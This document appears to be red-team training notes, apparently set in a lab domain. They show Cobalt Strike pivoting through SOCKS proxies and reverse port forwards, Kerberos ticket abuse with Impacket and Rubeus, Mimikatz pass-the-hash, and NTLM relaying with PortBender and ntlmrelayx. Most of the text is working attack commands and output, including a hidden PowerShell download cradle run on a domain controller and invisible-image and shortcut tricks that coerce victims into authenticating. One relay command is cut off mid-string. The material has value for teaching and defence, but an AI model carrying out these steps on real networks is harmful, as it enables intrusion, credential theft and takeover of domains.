# SOCKS Proxies

A SOCKS (short for Socket Secure) Proxy exchanges network packets between a client and a server.  A common implementation of a proxy server is found in web proxies - where a browser will connect to the proxy, which relays requests to the destination website and back to the browser (performing filtering etc along the way).  We can use this idea in an offensive application by turning our C2 server into a SOCKS proxy to tunnel external tooling into an internal network.
This is particularly helpful when we want to leverage toolsets such as Impacket.  Windows doesn't have a native capability to execute Python, so being able to execute them on our own system and tunnel the traffic through Beacon can expand our arsenal of available tooling.  It also carries additional OPSEC advantages - since we're not pushing offensive tooling onto the target or even executing any code on a compromised endpoint, it can shrink our footprint for detection.
Cobalt Strike has both a SOCKS4a and SOCKS5 proxy.  The main difference between them is that only SOCKS5 supports authentication and has some additional logging capabilities. Use the socks command on the Beacon that you want to act as the pivot point.

To start a SOCKS4a proxy simply run:

    beacon> socks 1080

For SOCKS5:

    beacon> socks 1080 socks5 disableNoAuth myUser myPassword enableLogging

The enableLogging option sends additional logs (such as authentication failures) to the VM console, which you unfortunately can't see easily when the team server running as a service.  Instead, you can use journalctl:

    ubuntu teamserver[687]: [*] SOCKS5 (18): ********** Constructing Socks5Command **********
    ubuntu teamserver[687]: [*] SOCKS5 (18): Greeting: NoAuth Authentication offered: 0
    ubuntu teamserver[687]: [*] SOCKS5 (18): Greeting: UserPwd Authentication offered: 2
    ubuntu teamserver[687]: [*] SOCKS5 (18): sendChosenAuthentication: Chosen Authentication Type: 2
    ubuntu teamserver[687]: [*] SOCKS5 (18): verifyUserPwd: Verifying User/Password Authentication
    ubuntu teamserver[687]: [*] SOCKS5 (18): verifyUserPwd: Verifying user:
    ubuntu teamserver[687]: [-] SOCKS5 (18): Invalid login attempt from user:
    ubuntu teamserver[687]: [-] SOCKS (18): Socks Error
    

You will now see port 1080 bound on the team server VM.

    attacker@ubuntu ~> sudo ss -lpnt
    State    Recv-Q   Send-Q     Local Address:Port        Peer Address:Port   Process
    LISTEN   0        128                    *:1080                   *:*       users:(("TeamServerImage",pid=687,fd=13))

- Since this is bound on all interfaces, any device that has network access to the team server VM may, in theory, interact with the SOCKS traffic.  Even though this should not be the case, the use of SOCKS5 gives an additional layer of protection.


The speed at which data is transferred over the proxy is determined by the sleep time of the Beacon that executed the socks command.  To set the Beacon to an interactive state, use sleep 0.  In most cases, this is a quality of life vs stealth trade-off.  The more frequently your Beacon talks to the team server, the louder it appears on the wire.  However, some tools may timeout and fail with longer sleep times so it's up to you to find a balance.

# Linux Tools

proxychains is a tool which acts as a wrapper around other applications to tunnel their traffic over a socks proxy.  First, we need to modify its configuration file to point to our Cobalt Strike socks proxy.

    attacker@ubuntu ~> sudo vim /etc/proxychains.conf


At the bottom of the file, you will see a default entry for SOCKS4:  socks4 127.0.0.1 9050.  We need to change this to match the settings of the proxy we started in Beacon.

    SOCKS4:  socks4 127.0.0.1 1080

OR

    SOCKS5:  socks5 127.0.0.1 1080 myUser myPassword

To tunnel a tool through proxychains, it's as simple as proxychains [tool] [tool args].  So to tunnel nmap, it would be:

    attacker@ubuntu ~> proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
    ProxyChains-3.1 (http://proxychains.sf.net)

    5985/tcp open   wsman
    
    Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds


There are some restrictions on the type of traffic that can be tunnelled, so you must make adjustments with your tools as necessary.  ICMP and SYN scans cannot be tunnelled, so we must disable ping discovery (-Pn) and specify TCP scans (-sT) for this to work.

You can also run tools from inside WSL on Windows.

# Windows Tools

We can also tunnel traffic from our Windows machine using a software utility called Proxifier.  To create a new proxy entry, go to Profile > Proxy Servers.  Click Add and enter the relevant details.

When asked if you want to use this proxy by default, select No.  But select Yes when prompted to go to the Proxification Rules.  Here, we tell Proxifier which applications to proxy and under what conditions.

Click Add to create a new rule and use the following:

- Name:  Tools
- Applications:  Any
- Target hosts:  10.10.120.0/24;10.10.122.0/23
- Target ports:  Any
- Action:  Proxy SOCKS5 10.10.5.50

To enable authentication to occur over the proxy, an application needs to be launched as a user from the target domain.  This can be achieved using runas /netonly or Mimikatz.

Let's use Active Directory Users and Computers (ADUC) as an example.  The file responsible for launching ADUC is dsa.msc, which is actually just a snap-in for mmc.exe.  Open a Command Prompt as a local admin, then launch mmc.exe via runas.

    PS C:\Users\Attacker> runas /netonly /user:DEV\bfarmer mmc.exe
    Enter the password for DEV\bfarmer:
    Attempting to start mmc.exe as user "DEV\bfarmer" ...
    
Go to File > Add/Remove Snap-in (or Ctrl + M for short), add the ADUC snap-in, then click OK.  Right-click on the snap-in, select Change Domain, enter dev.cyberbotic.io and click OK.  You will see Proxifier begin to capture and relay traffic and ADUC loads the content.  You may continue to drill down into the users and computers etc.

To achieve the same with Mimikatz:

    mimikatz # privilege::debug
    mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
    

PowerShell cmdlets that support credential objects can also be used.

    PS C:\Users\Attacker> $cred = Get-Credential
    PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select DNSHostName

# Pivoting with Kerberos 

Using Impacket through proxychains is a popular way to do this. First, let's use getTGT.py to request a TGT for jking with their AES256 hash.

    ubuntu@DESKTOP-3BSK7NO ~> proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking

    [*] Saving ticket in jking.ccache
    
This will automatically output the ticket in ccache format which can be used with other Impacket scripts.  However, we must first create an environment variable called KRB5CCNAME that will point to the ccache file.

    ubuntu@DESKTOP-3BSK7NO ~> export KRB5CCNAME=jking.ccache   
        
Now we can use psexec.py to get a SYSTEM shell on WEB.

    ubuntu@DESKTOP-3BSK7NO ~> proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io

    nt authority\system
    
    C:\Windows\system32> exit
    [*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0        

If you have a ticket in kirbi format obtained with another tool, it can be converted to ccache format for use with Impacket.  For example, here I'm using the TGT delegation trick to get a usable TGT for bfarmer from a non-elevated session.

    beacon> getuid
    [*] You are DEV\bfarmer
    
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
    
    [*] Action: Request Fake Delegation TGT (current user)

Base64 decode the ticket and write it to bfarmer.kirbi.

    ubuntu@DESKTOP-3BSK7NO ~> echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi

Then convert it using ticketConverter.py.

    ubuntu@DESKTOP-3BSK7NO ~> ticketConverter.py bfarmer.kirbi bfarmer.ccache
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    
This tool can also convert from ccache to kirbi.

Now let's use this TGT to interact with the SQL-2 service.

    ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io
    ProxyChains-3.1 (http://proxychains.sf.net)
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
  
    SQL> select @@servername;

This may require adding a static host entry to /etc/hosts and changing the proxy_dns setting in /etc/proxychains.conf to remote_dns.
Kerberos tickets can also be leveraged from the Windows attacker machine.  The first step is to add *.cyberbotic.io your Proxifier proxification rule(s).  This is because Kerberos uses hostnames rather than IP addresses and Proxifier won't proxy Kerberos traffic unless the domains are explicitly set in the rules.


Next, launch an instance of cmd.exe or powershell.exe using runas /netonly with a valid domain username, but a fake password.

    PS C:\Users\Attacker> runas /netonly /user:dev.cyberbotic.io\bfarmer powershell.exe
    Enter the password for dev.cyberbotic.io\bfarmer: FakePass
    Attempting to start powershell.exe as user "dev.cyberbotic.io\bfarmer" ...
    
The spawned process will have no Kerberos tickets in its cache.
    
    PS C:\Windows\system32> klist
    
    Current LogonId is 0:0x260072
    
    Cached Tickets: (0)

This method of pivoting prefers the presence of the correct service ticket(s) up front, rather than relying on a single TGT in the cache.  If we want to access the SQL-2 service through HeidiSQL then we need a service ticket for the MSSQLSvc service.  Let's use the TGT of bfarmer to do that (yes, requesting tickets through the proxy works as well).

    PS C:\Windows\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]MuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt
    PS C:\Windows\system32> klist

    Current LogonId is 0:0x260072
    
    Cached Tickets: (1)
    
    #0>     Client: bfarmer @ DEV.CYBERBOTIC.
        
Launch HeidiSQL from the same powershell window.

    PS C:\Windows\system32> C:\Tools\HeidiSQL\heidisql.exe
    
Set the target hostname to sql-2.dev.cyberbotic.io and connect.    
    
# Browsers

Firefox plus the FoxyProxy extension is ideal for pivoting a browser into the network, to view internal web applications.  Simply add a new entry in FoxyProxy that points to the Beacon SOCKS proxy.

Then navigate to the internal web server, 10.10.122.30.
You can also perform NTLM authentication following the steps outlined in this post. https://offensivedefence.co.uk/posts/ntlm-auth-firefox/

# Reverse Port Forwards 

Reverse Port Forwarding allows a machine to redirect inbound traffic on a specific port to another IP and port.  A useful implementation of this allows machines to bypass firewall and other network segmentation restrictions, to talk to nodes they wouldn't normally be able to.  For example, we can use the console of Domain Controller 2 to demonstrate that it does not have any outbound access to our team server.

    PS C:\Users\Administrator> hostname
    dc-2
    
    PS C:\Users\Administrator> iwr -Uri http://nickelviper.com/a
    iwr : Unable to connect to the remote server
    
We know of course that Workstation 2 does - so we can create a reverse port forward to relay traffic between Domain Controller 2 and our team server.

    beacon> rportfwd 8080 127.0.0.1 80
    [+] started reverse port forward on 8080 to 127.0.0.1:80
    
This will bind port 8080 on Workstation 2.

    beacon> run netstat -anp tcp
    TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING


Any traffic hitting this port will be tunnelled back to the team server over the C2 channel.  The team server will then relay the traffic to the forward host/port, then send the response back over Beacon.  Now, we can download the file via this port forward.

    PS C:\Users\Administrator> iwr -Uri http://wkstn-2:8080/a
    
    StatusCode        : 200

When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed.  Allowing access requires local admin privileges and clicking cancel will create an explicit block rule.
    
You must therefore create an allow rule before running a reverse port forward using either netsh or New-NetFirewallRule, as adding and removing rules does not create a visible alert.

    beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

Don't be lazy by disabling the firewall entirely. You can delete a firewall rule later by its DisplayName.

    beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"

# NTLM Relaying 

NTLM authentication uses a 3-way handshake between a client and server.  The high-level steps are as follows:

1. The client makes an authentication request to a server for a resource it wants to access.
2. The server sends a challenge to the client - the client needs to encrypt the challenge using the hash of their password.
3. The client sends the encrypted response to the server, which contacts a domain controller to verify the encrypted challenge is correct.

In an NTLM relay attack, an attacker is able to intercept or capture this authentication traffic and effectively allows them to impersonate the client against the same, or another service.  For instance, a client attempts to connect to Service A, but the attacker intercepts the authentication traffic and uses it to connect to Service B as though they were the client.

- Windows Server 2022 domain controllers enable "Network Server: Digitally sign communications (always)" to Enabled by default, making this style of attack unviable.

During an on-premise penetration test, NTLM relaying with tools like Responder and ntlmrelayx is quite trivial.  However, it's a different story with this style of red team assessment, not least because we can't typically run Python tools on Windows.  Port 445 is always bound and in use by Windows - even local admins can't arbitrarily redirect traffic bound to this port or bind another tool to this port.

It's still possible to do with Cobalt Strike, but requires the use of multiple capabilities simultaneously.

1. A driver to redirect traffic destined for port 445 to another port (e.g. 8445) that we can bind to.
2. A reverse port forward on the port the SMB traffic is being redirected to.  This will tunnel the SMB traffic over the C2 channel to our Team Server.
3. The tool of choice (ntlmrelayx) will be listening for SMB traffic on the Team Server.
4. A SOCKS proxy is to allow ntlmrelayx to send traffic back into the target network.

The flow looks something like this:

![overview](https://github.com/user-attachments/assets/0b81cdf6-6b37-495d-9117-6e3656582161)

First, ensure all the pre-requisites are in place before launching the actual attack.  Obtain a SYSTEM beacon on the machine you will capture the SMB traffic on.

Next, allow those ports inbound on the Windows firewall.

    beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
    beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

Then start two reverse port forwards - one for the SMB capture, the other for a PowerShell download cradle.

    beacon> rportfwd 8445 localhost 445
    [+] started reverse port forward on 8445 to localhost:445
    
    beacon> rportfwd 8080 localhost 80
    [+] started reverse port forward on 8080 to localhost:80

The final part of the setup is to start a SOCKS proxy that ntlmrelayx can use to send relay responses back into the network.

    beacon> socks 1080
    [+] started SOCKS4a server on: 1080
    
Now we can start ntlmrelayx.py listening for incoming connections on the Team Server.  The -c parameter allows us to execute an arbitrary command on the target after authentication has succeeded.

    attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc 

Where:

1. 10.10.122.10 is the IP address of dc-2.dev.cyberbotic.io, which is our target.
2. The encoded command is a download cradle pointing at http://10.10.123.102:8080/b, and /b is an SMB payload.

PortBender is a reflective DLL and aggressor script specifically designed to help facilitate relaying through Cobalt Strike.  It requires that the driver be located in the current working directory of the Beacon.  It makes sense to use C:\Windows\System32\drivers since this is where most Windows drivers go.

    beacon> cd C:\Windows\system32\drivers
    beacon> upload C:\Tools\PortBender\WinDivert64.sys
    
Then go to Cobalt Strike > Script Manager and load PortBender.cna from C:\Tools\PortBender - this adds a new PortBender command to the console.

    beacon> help PortBender
    Redirect Usage: PortBender redirect FakeDstPort RedirectedPort
    Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password
    Examples:
    	PortBender redirect 445 8445
    	PortBender backdoor 443 3389 praetorian.antihacker
    
Execute PortBender to redirect traffic from 445 to port 8445.

    beacon> PortBender redirect 445 8445
    [+] Launching PortBender module using reflective DLL injection
    Initializing PortBender in redirector mode
    Configuring redirection of connections targeting 445/TCP to 8445/TCP   


- This pretty much breaks any legitimate SMB service on the machine.

To trigger the attack, we need to coerce a user or a machine to make an authentication attempt to Workstation 2.  Let's do it manually for now, by using the console of Workstation 1 as the user nlamb.  This user is a domain admin, so we can relay the authentication request to the domain controller.

    C:\Users\nlamb>hostname
    wkstn-1
    
    C:\Users\nlamb>dir \\10.10.123.102\relayme
    
You should see PortBender log the connection and ntlmrelayx will spring into action.

    [*] SMBD-Thread-3: Received connection from 127.0.0.1, attacking target smb://10.10.122.10
    |S-chain|-<>-127.0.0.1:1080-<><>-10.10.122.10:445-<><>-OK

    [*] Executed specified command on host: 10.10.122.10
    
ntlmrelayx reports that the command was executed - we can check the web log to confirm we received a hit.

    	Request: GET /b
    	page Scripted Web Delivery (powershell)
    	null

All that's left is to link to the Beacon.

    beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
    [+] established link to child beacon: 10.10.122.10

To stop PortBender, stop the job and kill the spawned process.

- One of the main indicators of this activity is the driver load event for WinDivert.  You can find driver loads in Kibana using the "Loaded Drivers" saved search.

You can find driver loads in Kibana using Sysmon Event ID 6.  Even though the WinDivert driver has a valid signature, seeing a unique driver load on only one machine is an anomalous event.

    event.module: sysmon and event.code: 6 and not file.code_signature.subject_name: "Amazon Web Services, Inc."

## Forcing NTLM Authentication

In the real world, it's unlikely you can just jump onto the console of a machine as a privileged user and authenticate to your malicious SMB server.  You can of course just wait for a random event to occur, or try to socially engineer a privileged user.  However, there are also lots of techniques to "force" users to unknowingly trigger NTLM authentication attempts to your endpoint.

Here are a few possibilities.

#### 1x1 Images in Emails

If you have control over an inbox, you can send emails that have an invisible 1x1 image embedded in the body.  When the recipients view the email in their mail client, such as Outlook, it will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.

    <img src="\\10.10.123.102\test.ico" height="1" width="1" />

A sneakier means may be to modify the sender's email signature, so that even legitimate emails they send will trigger NTLM authentication from every recipient who reads them.

#### Windows Shortcuts

A Windows shortcut can have multiple properties including a target, working directory and an icon.  Creating a shortcut with the icon property pointing to a UNC path will trigger an NTLM authentication attempt when it's viewed in Explorer (it doesn't even have to be clicked).  A good location for these is on publicly readable shares.

The easiest way to create a shortcut is with PowerShell.

    $wsh = new-object -ComObject wscript.shell
    $shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
    $shortcut.IconLocation = "\\10.10.123.102\test.ico"
    $shortcut.Save()
    
#### Remote Authentication Triggers

Tools such as SpoolSample, SharpSystemTriggers and PetitPotam can force a computer into authenticating to us.  These generally work via Microsoft RPC protocols, such as MS-RPRN and MS-EFS.

# Relaying WebDAV 

Web Distributed Authoring and Versioning (aka WebDAV) is an extension that allows for basic file operations (create/copy/move/delete) over the HTTP protocol.  Windows supports the use of WebDAV via Explorer where users can enter a URI or map a drive to a WebDAV server.  The WebClient service facilitates Explorer's ability to use WebDAV.  This is set to DEMAND_START by default, so is generally only running if a user has actively used a WebDAV resource.  Some Windows technologies, such as SharePoint, use WebDAV fairly heavily.

    C:\Users\bfarmer>sc qc WebClient
    [SC] QueryServiceConfig SUCCESS
    
As discovered by Lee Christensen, the WebClient exposes a named pipe called DAV RPC SERVICE, which makes it fairly easy to enumerate remote targets to establish whether the WebClient service is running or not.  The GetWebDAVStatus repo by Dave Cossa provides C# and BOF projects that check for the presence of this named pipe.

    beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2    

This output shows that the service is running WKSTN-1, which makes it a viable target for this attack.  The steps are to coerce the service into authenticating to a malicious WebDAV server that we control and then relay the authentication.  A nice aspect of this attack is that we can force authentication to occur over any port, so we don't have to worry about needing PortBender (I can hear you all cheering).  All we need to ensure is that whatever port we choose is allowed inbound on the host firewall we're reverse port forwarding from.

The incoming authentication material will be that of the machine account.  ntlmrelayx can relay this to LDAP on a domain controller to abuse either RBCD (using the --delegate-access flag) or shadow creds (using the --shadow-credentials flag).  In either case, ensure you run the HTTP server on a port that will not clash with any of your HTTP listeners.  In this example, I've used port 8888.

    attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888
    ProxyChains-3.1 (http://proxychains.sf.net)
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Once that's up and running, punch a hole in the firewall and set the reverse port forward.

    beacon> getuid
    [*] You are DEV\bfarmer (admin)
    
    beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888
    beacon> rportfwd 8888 localhost 8888
    
Then use SharpSystemTriggers to trigger the authentication.  The WebDAV URL needs to point to the reverse port forward.

    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwned    

Once the traffic hits ntlmrelayx, it will relay to the domain controller.

    [*] HTTPD(8888): Connection from 127.0.0.1 controlled, attacking target ldaps://10.10.122.10

As indicated by the output above, a new machine account PVWUMPYT$ was created with password 4!t1}}I_CGJ}0OJ, which now has delegation rights to WKSTN-1$.  To complete the attack chain, calculate the AES256 hash from the password.

    PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:dev.cyberbotic.io /user:PVWUMPYT$ /password:'4!t1}}I_CGJ}0OJ'
    
    [*] Action: Calculate Password Hash(es)
    
Then perform the S4U2Proxy to request service tickets of your choosing.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:PVWUMPYT$ /impersonateuser:nlamb /msdsspn:cifs/wkstn-1.dev.cyberbotic.io /aes256:46B94228F43282498F562FEF99C5C4AF67269BE5C8AD31B193135C7BD38A28A2 /nowrap
    
Don't forget to remove the fake computer account.

The shadow credentials option will automatically dump a certificate file for you.

    attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888

It can be converted to ccache format to use with Impacket, or base64 encoded to use with Rubeus.

    attacker@ubuntu ~> cat ROsU1G59.pfx | base64 -w 0
    MIII3Q[...snip...]YFLqI=
    
Since this is a certificate, we use it to request a TGT first which can then be used for S4U2Self.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIII3Q[...snip...]YFLqI= /password:wBaP2YhsR7RgY0MZ6jwk /nowrap
    
    [*] Action: Ask TGT

Ensure the keys are deleted after the attack.
